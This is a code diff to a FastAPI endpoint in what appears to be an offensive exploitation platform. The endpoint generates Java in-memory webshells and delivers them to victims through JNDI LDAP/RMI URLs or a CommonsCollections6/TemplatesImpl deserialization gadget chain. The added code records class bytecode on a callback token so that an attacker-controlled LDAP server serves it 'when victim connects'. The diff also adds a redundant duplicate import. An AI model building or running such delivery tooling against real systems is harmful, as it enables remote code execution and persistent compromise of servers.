@@ -8,6 +8,8 @@ from fastapi import APIRouter, Depends, HTTPException, status
 from sqlalchemy import select
 from sqlalchemy.ext.asyncio import AsyncSession
 
+from sqlalchemy import select
+
 from ..auth.deps import current_user
 from ..config import get_settings
 from ..db import get_session
@@ -42,10 +44,25 @@ async def _register_to_sidecar(sidecar_url: str, token: str, class_name: str, by
         return False
 
 
+async def _update_token_intent(session: AsyncSession, token: str, intent: str,
+                               class_name: str, bytecode_b64: str) -> None:
+    """Set token intent + payload_spec so LDAP server serves the correct class."""
+    res = await session.execute(select(OobToken).where(OobToken.token == token))
+    tok = res.scalar_one_or_none()
+    if tok:
+        tok.intent = intent
+        spec = dict(tok.payload_spec or {})
+        spec["class_name"] = class_name
+        spec["bytecode_b64"] = bytecode_b64
+        tok.payload_spec = spec
+        await session.commit()
+
+
 @router.post("/generate", response_model=MemshellResponse)
 async def generate_memshell(
     body: MemshellRequest,
     user: User = Depends(current_user),
+    session: AsyncSession = Depends(get_session),
 ) -> MemshellResponse:
     s = get_settings()
     chain_id = f"memshell_{body.framework}_{body.type}"
@@ -95,10 +112,15 @@ async def generate_memshell(
     if deliver_via == "jndi_ldap" and token:
         url = jndi_ldap_url(token, s, class_name)
         delivery_payload = PayloadResponse(type="jndi_ldap", content_type="text/plain", value=url)
+        # Update token intent so LDAP server serves the class when victim connects
+        if bytecode_b64:
+            await _update_token_intent(session, token, "jndi", class_name, bytecode_b64)
 
     elif deliver_via == "jndi_rmi" and token:
         url = jndi_rmi_url(token, s, class_name)
         delivery_payload = PayloadResponse(type="jndi_rmi", content_type="text/plain", value=url)
+        if bytecode_b64:
+            await _update_token_intent(session, token, "jndi", class_name, bytecode_b64)
 
     elif deliver_via == "serialize" and bytecode_b64:
         # Wrap class bytes in CC6+TemplatesImpl gadget chain via sidecar.
